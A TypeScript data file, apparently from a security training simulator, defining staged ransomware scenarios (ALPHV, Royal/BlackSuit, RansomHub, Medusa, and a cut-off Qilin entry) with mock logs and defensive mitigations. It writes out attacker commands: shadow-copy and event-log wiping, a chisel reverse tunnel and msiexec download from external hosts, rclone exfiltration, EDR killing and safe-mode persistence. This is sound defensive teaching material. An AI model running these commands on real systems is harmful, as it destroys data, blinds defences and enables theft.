import { LegacyDraftScenario } from './normalize-legacy-draft-scenario';

export const OFFICIAL_BATCH6_RANSOMWARE_SUPPLYCHAIN_CLR_SCENARIOS: LegacyDraftScenario[] = [
  // ============================================================================
  // PART 1: 10 OFFICIAL RANSOMWARE & EXTORTION SCENARIOS (RANSOMWARE_EXTORTION)
  // ============================================================================
  {
    id: 'alphv-blackcat-sphynx-rust-impacket-exmatter',
    title: 'CISA AA23-353A, Mandiant & Microsoft — ALPHV / BlackCat (Sphynx) Rust Ransomware, ExMatter Exfiltration & ESXi/Windows Encryption',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA/FBI Joint Cybersecurity Advisory AA23-353A (#StopRansomware: ALPHV Blackcat) and Mandiant/Microsoft Threat Intelligence: ALPHV affiliates authenticate the Rust-compiled Sphynx ransomware binary via an operator access token (-k), enable remote-to-remote NTFS symbolic link evaluation via fsutil.exe, exfiltrate corporate shares with the custom .NET ExMatter tool over WebDAV/SFTP, and execute multi-threaded AES-CTR / ChaCha20 encryption across Windows hosts and VMware ESXi hypervisors.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'ALPHV / BlackCat Affiliate C2 & ExMatter Drop', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'ExMatter (.NET WebDAV/SFTP Exfiltrator)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Windows Host (fsutil Symlink + bcat.exe -k)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA23-353A / Defender XDR & ESXi Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'SMB Shares & ESXi VMFS Datastores (AES/ChaCha20)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: ExMatter .NET Data Exfiltration & Self-Erasure Before Encryption',
        narration:
          'Before deploying the encryptor, the ALPHV affiliate stages ExMatter (a compiled .NET exfiltration utility disguised as Svchost.exe orighosting in C:\\ProgramData) that enumerates all local and mounted network drives for Office/PDF/CAD documents, uploads them to an attacker-controlled SFTP/WebDAV server over port 443, and spawns powershell.exe to overwrite and delete its own binary on disk.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Exfiltration (T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol)',
        technicalCommands: [
          'C:\\ProgramData\\ExMatter.exe (Enumerates .docx, .xlsx, .pdf, .dwg across C:\\..Z:\\ -> SFTP/WebDAV upload)',
          'powershell.exe -WindowStyle Hidden -Command "[System.IO.File]::WriteAllBytes(\'C:\\ProgramData\\ExMatter.exe\', (New-Object Byte[] 4096)); Remove-Item \'C:\\ProgramData\\ExMatter.exe\' -Force"',
        ],
        defenseMitigation:
          'Alert on unsigned .NET binaries initiating high-volume outbound SFTP/SSH (port 22) or WebDAV (port 443) transfers followed by PowerShell WriteAllBytes self-wiping commands.',
        logs: [
          {
            id: 'alphv-1',
            timestamp: '01:14:22.108',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'ExMatter.exe',
            CommandLine: 'C:\\ProgramData\\ExMatter.exe',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\ExMatter.exe | Company: .NET Assembly (ExMatter v2.4) | DestinationIp: 185.220.101.77:443 (WebDAV/SFTP) | PostAction: PowerShell WriteAllBytes Self-Erase | Advisory: CISA AA23-353A',
            parsedFields: {
              ExfiltrationTool: 'ExMatter (.NET SFTP/WebDAV Stealer)',
              TargetedExtensions: '.docx, .xlsx, .pdf, .sql, .bak, .vmdk',
              AntiForensics: 'WriteAllBytes Zero-Overwrite + Remove-Item',
              AdvisoryId: 'CISA AA23-353A',
            },
          },
        ],
        packets: [
          {
            id: 'alphv-pkt-1',
            timestamp: '01:14:25.400',
            protocol: 'HTTPS',
            sourceIp: '10.10.20.44',
            destIp: '185.220.101.77',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 16384,
            hexDump: '53 53 48 2D 32 2E 30 2D 52 65 62 65 78 53 53 48 5F 35 2E 30 2E 37 37 30 30 2E 30 0D 0A 45 78 4D 61 74 74 65 72',
            decodedString: 'SSH-2.0-RebexSSH_5.0.7700.0 (ExMatter .NET SFTP Library Fingerprinted in CISA AA23-353A)',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Access-Token Unpacking (-k), fsutil R2R Symlink Enablement & Shadow Wipe',
        narration:
          'The operator executes the Rust-compiled BlackCat/Sphynx binary with `-k <access_token>` (which derives the ChaCha20 key to decrypt the embedded JSON configuration), runs `fsutil behavior set SymlinkEvaluation R2L:1 R2R:1` so the encryptor can traverse remote SMB symlinks, increases `NetShareSessionPerServer` in the registry, and wipes Volume Shadow Copies.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Impact Preparation (T1490 - Inhibit System Recovery / T1140)',
        technicalCommands: [
          'bcat_sphynx.exe -k 8f94a2c1e0b74d19a3c8f5e2d1b09876 --propagate',
          'fsutil.exe behavior set SymlinkEvaluation R2L:1 R2R:1',
          'vssadmin.exe delete shadows /all /quiet && wmic.exe shadowcopy delete /nointeractive',
        ],
        defenseMitigation:
          'Monitor Sysmon EventID 1 for `fsutil.exe behavior set SymlinkEvaluation R2L:1 R2R:1` (a classic ALPHV/BlackCat pre-encryption signature) and block unauthorized `vssadmin.exe` execution.',
        logs: [
          {
            id: 'alphv-2',
            timestamp: '01:18:09.512',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'fsutil.exe',
            CommandLine: 'fsutil.exe behavior set SymlinkEvaluation R2L:1 R2R:1',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\Temp\\bcat_sphynx.exe | Image: C:\\Windows\\System32\\fsutil.exe | CommandLine: fsutil behavior set SymlinkEvaluation R2L:1 R2R:1 | Note: Enables Remote-to-Local and Remote-to-Remote SMB symlink encryption',
            parsedFields: {
              ParentBinary: 'bcat_sphynx.exe (Rust ALPHV/BlackCat Sphynx)',
              AccessTokenSwitch: '-k 8f94a2c1e0b74d19a3c8f5e2d1b09876',
              SymlinkEvaluation: 'R2L:1 R2R:1 Enabled',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Embedded Impacket PsExec Propagation, ESXi VM Kill & AES-CTR/ChaCha20 Encryption',
        narration:
          'Using credentials harvested via built-in NetExec/Impacket routines (`--propagate`), BlackCat spreads across SMB shares, clears all Windows Event Logs via `wevtutil.exe cl`, kills VMware ESXi virtual machines via `esxcli vm process kill --type=force`, and encrypts files using hardware-accelerated AES-128-CTR or ChaCha20 with RSA-2048 key wrapping (`RECOVER-<ext>-FILES.txt`).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1070.001 - Clear Windows Event Logs)',
        technicalCommands: [
          'for /F "tokens=*" %1 in (\'wevtutil.exe el\') do wevtutil.exe cl "%1"',
          'esxcli vm process list && esxcli vm process kill --type=force --world-id=419820',
          'bcat_sphynx.exe -k 8f94a2c1... (Encrypts shares & /vmfs/volumes -> .sphynx & RECOVER-sphynx-FILES.txt)',
        ],
        defenseMitigation:
          'Segment ESXi management interfaces onto isolated jump VLANs with MFA, enforce SMB signing, and forward Windows Event Logs in real time prior to `wevtutil.exe cl` truncation.',
        logs: [
          {
            id: 'alphv-3',
            timestamp: '01:22:48.904',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'bcat_sphynx.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\bcat_sphynx.exe | TargetFilename: \\\\corp-fs01\\finance\\RECOVER-sphynx-FILES.txt | Cipher: AES-128-CTR / ChaCha20 + RSA-2048 | EventLogsCleared: Security EventID 1102',
            parsedFields: {
              RansomwareFamily: 'ALPHV / BlackCat (Sphynx Rust Variant)',
              EncryptionMode: 'AES-128-CTR (Hardware AES-NI) / ChaCha20 + RSA-2048',
              RansomNote: 'RECOVER-sphynx-FILES.txt',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'royal-blacksuit-ransomware-chacha20-restartmanager',
    title: 'CISA AA23-061A / AA24-219A & Unit 42 — Royal & BlackSuit Ransomware: Callback Phishing, Windows Restart Manager File Unlock & OpenSSL Partial Encryption',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA/FBI Joint Advisories AA23-061A (Royal Ransomware) and AA24-219A (BlackSuit Ransomware): operators gain initial access via callback phishing or BatLoader SEO poisoning, use Windows Restart Manager APIs (RstrtMgr.dll!RmStartSession & RmShutdown) to forcibly unlock active SQL/VHDX files without crashing the OS, and execute OpenSSL AES-256-CBC / ChaCha20 percentage-based partial encryption (-ep).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Royal / BlackSuit Operator (Chisel / RDP)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'BatLoader / Callback RMM Staging', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Windows Server (RstrtMgr.dll File Unlocker)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-219A / Unit 42 EDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Database & File Shares (.royal / .blacksuit)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Callback Phishing / BatLoader RMM Delivery & Chisel Reverse Tunneling',
        narration:
          'Royal/BlackSuit affiliates lure employees via subscription-cancellation callback phishing emails or trojanized MSI installers (BatLoader) into launching legitimate remote management tools (Syncro, AnyDesk, Atera), then deploy `chisel.exe` and `adfind.exe` to map Active Directory trusts and file servers.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access & Discovery (T1219 - Remote Access Software / T1087.002)',
        technicalCommands: [
          'msiexec.exe /i "https://cdn-zoom-update.com/ZoomInstallerFull.msi" /qn (BatLoader MSI staging)',
          'adfind.exe -f "(objectcategory=computer)" && chisel.exe client 198.51.100.88:8443 R:socks',
        ],
        defenseMitigation:
          'Block unauthorized RMM binaries (AnyDesk, Atera, Syncro) via WDAC/AppLocker and alert on `adfind.exe` LDAP enumeration flags (`-f (objectcategory=...)`).',
        logs: [
          {
            id: 'royal-1',
            timestamp: '02:05:11.330',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'adfind.exe',
            CommandLine: 'C:\\Users\\Public\\adfind.exe -f (objectcategory=computer)',
            raw: 'EventID: 1 | ParentImage: C:\\ProgramData\\AnyDesk.exe | Image: C:\\Users\\Public\\adfind.exe | CommandLine: adfind.exe -f (objectcategory=computer) | Tunnel: chisel.exe reverse SOCKS5 | Advisory: CISA AA23-061A / AA24-219A',
            parsedFields: {
              InitialVector: 'Callback Phishing / BatLoader MSI',
              ReconTool: 'AdFind.exe Active Directory Enumeration',
              TunnelTool: 'Chisel SOCKS5 Proxy',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: vssadmin Shadow Wipe & Windows Restart Manager (RstrtMgr.dll) File Lock Release',
        narration:
          'Upon execution (`royal.exe -id <32_char_id> -ep 50`), the binary deletes Volume Shadow Copies via `vssadmin.exe` and invokes the Windows Restart Manager API (`RmStartSession`, `RmRegisterResources`, `RmGetList`, and `RmShutdown` in `C:\\Windows\\System32\\RstrtMgr.dll`) to automatically identify and terminate any application or service holding an open file handle on target database or virtual disk files.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Impact Preparation (T1489 - Service Stop / T1490 - Inhibit System Recovery)',
        technicalCommands: [
          'vssadmin.exe delete shadows /all /quiet',
          'RstrtMgr.dll!RmStartSession(&dwSession, 0, szSessionKey) -> RmRegisterResources() -> RmShutdown(dwSession, RmForceShutdown, NULL)',
        ],
        defenseMitigation:
          'Monitor Windows Application Event Log ID `10000` / `10001` (`RestartManager` session initiation by non-installer processes from `C:\\Users` or `C:\\Windows\\Temp`).',
        logs: [
          {
            id: 'royal-2',
            timestamp: '02:09:41.780',
            source: 'Windows Event Log',
            severity: 'critical',
            EventCode: 10000,
            ProcessName: 'blacksuit.exe',
            raw: 'LogName: Application | Source: Microsoft-Windows-RestartManager | EventID: 10000 | Message: Starting session 0 - 2026-11-17T02:09:41Z. Controlling Process: C:\\Windows\\Temp\\blacksuit.exe | TerminatedLockHolders: sqlservr.exe, vmms.exe',
            parsedFields: {
              ApiAbused: 'RstrtMgr.dll (RmStartSession / RmRegisterResources / RmShutdown)',
              EventLogSignature: 'Microsoft-Windows-RestartManager EventID 10000',
              UnlockedTargets: 'SQL Server .mdf/.ldf and Hyper-V .vhdx files',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: OpenSSL AES-256-CBC Percentage-Based Partial Encryption (-ep) Across Shares',
        narration:
          'Using statically linked OpenSSL routines and a multi-threaded I/O completion port queue (2× CPU core count), Royal/BlackSuit encrypts files using AES-256-CBC and RSA-4096. Controlled by the `-ep <1..100>` flag, files larger than 5.24 MB undergo intermittent percentage-based encryption to maximize speed before appending `.royal` or `.blacksuit` and dropping `README.royal.txt`.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        technicalCommands: [
          'blacksuit.exe -id 9A4F8C2E1B7D0A3E5F6C8B1D2E3F4A5B -path "\\\\corp-dc01\\shares" -ep 50',
          'OpenSSL EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), ...) -> Rename to *.blacksuit & write README.BlackSuit.txt',
        ],
        defenseMitigation:
          'Deploy canary files on SMB shares, enforce host firewall rules blocking workstation-to-workstation SMB (TCP 445), and maintain offline immutable backups.',
        logs: [
          {
            id: 'royal-3',
            timestamp: '02:14:05.912',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'blacksuit.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\Temp\\blacksuit.exe | CommandLine: blacksuit.exe -id 9A4F... -ep 50 | TargetFilename: D:\\SQLData\\README.BlackSuit.txt | Cipher: OpenSSL AES-256-CBC (50% Intermittent Stride) + RSA-4096',
            parsedFields: {
              RansomwareLineage: 'Conti -> Royal -> BlackSuit (CISA AA24-219A)',
              CryptoEngine: 'Statically linked OpenSSL AES-256-CBC + RSA-4096',
              EncryptionPercentageFlag: '-ep 50 (50% Intermittent Stride)',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'ransomhub-edrkiller-tdsskiller-golocks',
    title: 'CISA AA24-242A, Symantec & Mandiant — RansomHub Ransomware: Kaspersky TDSSKiller / EDRKillShifter BYOVD, Safe-Mode Boot & Curve25519 Encryption',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA/FBI/MS-ISAC Joint Advisory AA24-242A (#StopRansomware: RansomHub Ransomware), Symantec, and Mandiant research: RansomHub affiliates abuse the signed Kaspersky TDSSKiller utility (`klbg.sys`) or custom EDRKillShifter BYOVD loader to terminate EDR processes from Ring-0, configure Safe Mode with Networking (`bcdedit /set safeboot network`) to bypass security services on reboot, and execute Golang/C++ Curve25519 + XChaCha20 encryption protected by a runtime `-pass` SHA-256 key.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'RansomHub Affiliate (Atera / AnyDesk C2)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'TDSSKiller.exe / EDRKillShifter (klbg.sys)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Endpoint (bcdedit safeboot + ransomhub.exe -pass)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA24-242A / Kernel Driver Blocklist Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise Volumes & S3/SMB Backups (XChaCha20)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Signed TDSSKiller.exe (`klbg.sys`) & EDRKillShifter BYOVD Sensor Termination',
        narration:
          'After initial access via VPN appliances or ZeroLogon, the RansomHub affiliate deploys either the legitimate signed Kaspersky `TDSSKiller.exe` rootkit scanner (`-dcsvc`) or `EDRKillShifter` (a loader that unpacks a vulnerable signed driver with a randomized 5-character `.sys` filename) to terminate Protected Process Light (PPL) EDR sensors from kernel mode.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1562.001 - Impair Defenses: Disable or Modify Tools)',
        technicalCommands: [
          'TDSSKiller.exe -l C:\\Windows\\Temp\\tdss.log -dcsvc MsMpEng.exe (Abuses signed klbg.sys driver to delete/kill service)',
          'EDRKillShifter.exe -p 4e8a9c1b... (Unpacks vulnerable signed driver -> ZwTerminateProcess on EDR PIDs)',
        ],
        defenseMitigation:
          'Enable Microsoft Vulnerable Driver Blocklist (HVCI) and alert on Sysmon EventID 6 loading `klbg.sys` or unsigned/renamed drivers from `C:\\Users\\Public` or `C:\\Windows\\Temp`.',
        logs: [
          {
            id: 'rhub-1',
            timestamp: '03:11:08.402',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 6,
            ProcessName: 'TDSSKiller.exe',
            raw: 'EventID: 6 | ImageLoaded: C:\\Windows\\Temp\\klbg.sys | Signed: true (Kaspersky Lab) | InvokingProcess: TDSSKiller.exe -dcsvc | FollowUp: EDRKillShifter kernel termination of CrowdStrike/Defender/SentinelOne | Advisory: CISA AA24-242A',
            parsedFields: {
              LolbinAbused: 'Kaspersky TDSSKiller.exe (-dcsvc service deletion)',
              SecondaryTool: 'EDRKillShifter BYOVD Loader',
              AdvisoryId: 'CISA AA24-242A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Safe-Mode RunOnce Persistence (`*safemode`) & Shadow Copy / Volume Mounting',
        narration:
          'When `-safeboot` is passed, RansomHub writes its execution command (prefixed with an asterisk `*` in `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`, which instructs Windows to execute the key even inside Safe Mode), sets `bcdedit.exe /set {current} safeboot minimal`, mounts all hidden unmounted disk volumes via `FindFirstVolumeW` / `SetVolumeMountPointW`, and deletes shadow copies.',
        activeNodes: ['target', 'siem'],
        mitreTactic: 'Defense Evasion & Persistence (T1562.009 - Safe Mode Boot / T1547.001)',
        technicalCommands: [
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "*RansomHub" /t REG_SZ /d "C:\\ProgramData\\rhub.exe -pass 7c9e1a..." /f',
          'bcdedit.exe /set {current} safeboot minimal && shutdown.exe /r /t 0',
        ],
        defenseMitigation:
          'Block `bcdedit.exe /set * safeboot` via EDR behavioral rules and alert on `Run` or `RunOnce` registry value names beginning with an asterisk (`*`), which specifically target Windows Safe Mode.',
        logs: [
          {
            id: 'rhub-2',
            timestamp: '03:14:29.118',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 13,
            ProcessName: 'rhub.exe',
            raw: 'EventID: 13 | EventType: SetValue | TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*RansomHub | Details: C:\\ProgramData\\rhub.exe -pass 7c9e1a... | PrecedingCommand: bcdedit.exe /set {current} safeboot minimal',
            parsedFields: {
              SafeModeRegistryTrick: 'Asterisk-prefixed RunOnce value (*RansomHub executes in Safe Mode)',
              BootConfigChange: 'bcdedit.exe /set {current} safeboot minimal',
              MitreTechnique: 'T1562.009 (Safe Mode Boot)',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: SHA-256 `-pass` Config Decryption & Curve25519 / XChaCha20 Encryption',
        narration:
          'Only when supplied the exact 64-character hex password (`-pass <sha256_key>`) does the RansomHub binary decrypt its internal configuration in memory (preventing sandbox detonation without the operator CLI key), clear Windows Event Logs, and encrypt local and SMB files using Curve25519 (X25519 ECDH) and XChaCha20/AES-GCM.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1480 - Execution Guardrails)',
        technicalCommands: [
          'rhub.exe -pass 7c9e1a4b8d2f0e3a5c6b9d8e7f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a -network=true',
          'vssadmin.exe delete shadows /all /quiet && shadowcopy delete',
        ],
        defenseMitigation:
          'Configure EDR to continue running inside Windows Safe Mode (`SafeBoot\\Minimal` driver registration) and isolate hosts exhibiting mass SMB rename activity.',
        logs: [
          {
            id: 'rhub-3',
            timestamp: '03:19:52.740',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'rhub.exe',
            raw: 'EventID: 11 | Image: C:\\ProgramData\\rhub.exe | CommandLine: rhub.exe -pass <64-hex> -network=true | TargetFilename: C:\\Users\\Public\\README_<random>.txt | Cipher: Curve25519 + XChaCha20 (Knight/Cyclops Rebrand Lineage)',
            parsedFields: {
              RansomwareFamily: 'RansomHub (Knight / Cyclops Code Lineage)',
              AntiSandboxGuardrail: 'Requires -pass SHA-256 CLI key to decrypt embedded JSON config',
              EncryptionAlgorithm: 'Curve25519 ECDH + XChaCha20 / AES-256',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'medusa-ransomware-gaze-abyss-pdqdeploy',
    title: 'CISA AA25-071A & Palo Alto Unit 42 — Medusa Ransomware: ScreenConnect RMM, gaze.exe (ThrottleStop.sys) Kernel Callback Killer & PDQ Deploy Encryption',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in CISA/FBI/MS-ISAC Joint Cybersecurity Advisory AA25-071A (#StopRansomware: Medusa Ransomware) and Palo Alto Networks Unit 42 research: Medusa operators establish persistence via ConnectWise ScreenConnect or AnyDesk, deploy `gaze.exe` (which loads signed `ThrottleStop.sys` / `rwdrv.sys` to zero out kernel PsSetCreateProcessNotifyRoutine callbacks), push the `gaze.dll`/`medusa.exe` payload domain-wide via PDQ Deploy or PsExec, and encrypt assets with AES-256-CBC + RSA-2048 (`.medusa`).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Medusa Operator (ScreenConnect / Rclone)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'gaze.exe Kernel Killer (ThrottleStop.sys)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'PDQ Deploy / PsExec Distribution Server', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CISA AA25-071A / Unit 42 XDR Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Enterprise Fleet (.medusa AES-256-CBC)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: ScreenConnect RMM Foothold, Advanced IP Scanner & Rclone Exfiltration',
        narration:
          'Following initial exploitation of unpatched perimeter web/VPN services (such as ConnectWise ScreenConnect or Fortinet EMS), Medusa operators install persistent RMM clients (`ScreenConnect.ClientService.exe`), map the internal network using `advanced_ip_scanner.exe`, and exfiltrate sensitive shares using `rclone.exe` disguised as `svchost.exe`.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Initial Access & Exfiltration (T1190 / T1219 / T1567.002)',
        technicalCommands: [
          'C:\\Program Files (x86)\\ScreenConnect Client\\ScreenConnect.ClientService.exe',
          'C:\\Windows\\Temp\\svchost.exe copy "\\\\corp-fs01\\hr" mega:medusa_leak --transfers 12 (Renamed rclone.exe)',
        ],
        defenseMitigation:
          'Detect renamed `rclone.exe` binaries via PE `OriginalFileName=rclone.exe` metadata in Sysmon EventID 1 and restrict unauthorized ScreenConnect instance domains.',
        logs: [
          {
            id: 'medusa-1',
            timestamp: '04:08:15.209',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'svchost.exe',
            CommandLine: 'C:\\Windows\\Temp\\svchost.exe copy "\\\\corp-fs01\\hr" mega:medusa_leak --transfers 12',
            raw: 'EventID: 1 | Image: C:\\Windows\\Temp\\svchost.exe | OriginalFileName: rclone.exe | ParentImage: ScreenConnect.WindowsClient.exe | Advisory: CISA AA25-071A (#StopRansomware: Medusa)',
            parsedFields: {
              MasqueradedBinary: 'C:\\Windows\\Temp\\svchost.exe (OriginalFileName: rclone.exe)',
              RmmPersistence: 'ConnectWise ScreenConnect Client',
              AdvisoryId: 'CISA AA25-071A',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: `gaze.exe` Loading Signed `ThrottleStop.sys` (`rwdrv.sys`) to Blind Kernel Callbacks',
        narration:
          'To neutralize endpoint protection before mass deployment, Medusa drops `gaze.exe` (also known as Abyss Locker / Medusa killer) alongside `ThrottleStop.sys` (renamed `rwdrv.sys`, CVE-2025-7771). `gaze.exe` uses physical memory read/write IOCTLs in `ThrottleStop.sys` to overwrite `PspCreateProcessNotifyRoutine` and `ObRegisterCallbacks` arrays in kernel RAM.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1562.001 - Impair Defenses / T1068 - BYOVD)',
        technicalCommands: [
          'sc.exe create rwdrv binPath= "C:\\Windows\\Temp\\rwdrv.sys" type= kernel && sc.exe start rwdrv',
          'C:\\Windows\\Temp\\gaze.exe (Patches kernel PspCreateProcessNotifyRoutine & ObRegisterCallbacks via ThrottleStop.sys IOCTLs)',
        ],
        defenseMitigation:
          'Block `ThrottleStop.sys` (`rwdrv.sys`) hashes via WDAC/HVCI and monitor System EventID 7045 for kernel driver services created from `C:\\Windows\\Temp`.',
        logs: [
          {
            id: 'medusa-2',
            timestamp: '04:12:33.614',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 6,
            ProcessName: 'gaze.exe',
            raw: 'EventID: 6 | ImageLoaded: C:\\Windows\\Temp\\rwdrv.sys (Signed ThrottleStop.sys) | InvokingProcess: C:\\Windows\\Temp\\gaze.exe | Action: ArbitraryPhysicalMemoryRW -> Zeroing EDR Kernel Callbacks',
            parsedFields: {
              EdrKillerTool: 'gaze.exe (Medusa Kernel Callback Wiper)',
              VulnerableDriver: 'rwdrv.sys (ThrottleStop.sys physical memory R/W)',
              TargetedKernelArray: 'nt!PspCreateProcessNotifyRoutine & ObRegisterCallbacks',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: PDQ Deploy Mass Distribution, VSS Deletion & `.medusa` AES-256-CBC Encryption',
        narration:
          'Using PDQ Deploy (`PDQDeployConsole.exe`) or `psexec.exe -s`, the operator pushes the Medusa encryptor (`gaze.exe` / `medusa.exe`) across all domain hosts. Medusa terminates over 280 backup, database, and mail services (`vss`, `sql`, `veeam`, `sophos`), runs `vssadmin Delete Shadows /all /quiet`, deletes `C:\\*.vhd`, and encrypts files with AES-256-CBC + RSA-2048 (`.medusa` and `!!!READ_ME_MEDUSA!!!.txt`).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Lateral Movement & Impact (T1072 - Software Deployment Tools / T1486)',
        technicalCommands: [
          'vssadmin.exe Delete Shadows /all /quiet && wbadmin.exe delete catalog -quiet',
          'wmic.exe process where name="sqlservr.exe" call terminate && del /s /f /q C:\\*.vhd E:\\*.bac',
          'gaze.exe -v "\\\\corp-nas\\shares" (Encrypts with AES-256-CBC -> .medusa & !!!READ_ME_MEDUSA!!!.txt)',
        ],
        defenseMitigation:
          'Require tiered administrative accounts for software deployment consoles (PDQ Deploy, SCCM) and block `del /s /f /q *.vhd` and `wbadmin delete catalog` via EDR.',
        logs: [
          {
            id: 'medusa-3',
            timestamp: '04:17:50.102',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'gaze.exe',
            raw: 'EventID: 11 | Image: C:\\Windows\\PDQDeployRunner\\service-1\\exec\\gaze.exe | TargetFilename: C:\\Users\\Public\\!!!READ_ME_MEDUSA!!!.txt | Extension: .medusa | Cipher: AES-256-CBC + RSA-2048',
            parsedFields: {
              DistributionMechanism: 'PDQ Deploy / PsExec Domain Push',
              RansomNote: '!!!READ_ME_MEDUSA!!!.txt',
              EncryptedExtension: '.medusa',
            },
          },
        ],
        packets: [],
      },
    ],
  },
  {
    id: 'qilin-agenda-rust-chrome-cred-harvester-esxi',
    title: 'Sophos X-Ops, Trend Micro & Group-IB — Qilin (Agenda) Ransomware: GPO PowerShell Chrome Credential Harvester, SafeBoot & Rust/Go Multi-Platform Encryption',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1486',
    description:
      'Grounded in Sophos X-Ops, Trend Micro, and Group-IB threat intelligence on Qilin (Agenda) ransomware: affiliates link a malicious Group Policy logon script (`IPScanner.ps1` / `logon.ps1`) across Active Directory so every user workstation automatically decrypts and dumps saved Chrome/Edge credentials (`Login Data`) to a central SMB share before deploying the Rust/Golang Qilin encryptor across Windows and VMware ESXi.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Qilin / Agenda Affiliate Operator', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'AD GPO Logon Script (Chrome Login Data Stealer)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Domain Workstations & Servers (qilin.exe)', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Sophos X-Ops / AD EventID 5136 & Sysmon Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Windows Shares & ESXi Datastores (.qilin)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Active Directory GPO Logon Script Harvesting Chrome/Edge DPAPI Credentials',
        narration:
